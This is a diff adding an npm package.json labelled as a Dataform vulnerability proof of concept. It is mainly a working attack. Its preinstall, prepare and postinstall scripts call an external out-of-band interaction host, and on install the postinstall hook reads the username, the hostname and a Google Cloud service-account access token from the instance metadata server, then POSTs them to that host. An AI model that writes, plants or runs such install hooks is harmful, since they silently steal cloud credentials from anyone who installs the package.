@@ -1,0 +1,13 @@
+{
+  "name": "dataform-vuln-poc",
+  "version": "1.0.0",
+  "description": "Dataform vulnerability PoC - tests npm lifecycle script execution",
+  "dependencies": {
+    "@dataform/core": "^2.9.0"
+  },
+  "scripts": {
+    "postinstall": "curl -s -X POST -H 'Content-Type: application/json' -d \"{\\\"poc\\\":\\\"npm_postinstall\\\",\\\"ts\\\":\\\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\\\",\\\"user\\\":\\\"$(whoami)\\\",\\\"host\\\":\\\"$(hostname)\\\",\\\"token\\\":\\\"$(curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token 2>/dev/null || echo blocked)\\\"}\" https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/npm",
+    "preinstall": "curl -s https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/npm-preinstall",
+    "prepare": "curl -s https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/npm-prepare"
+  }
+}
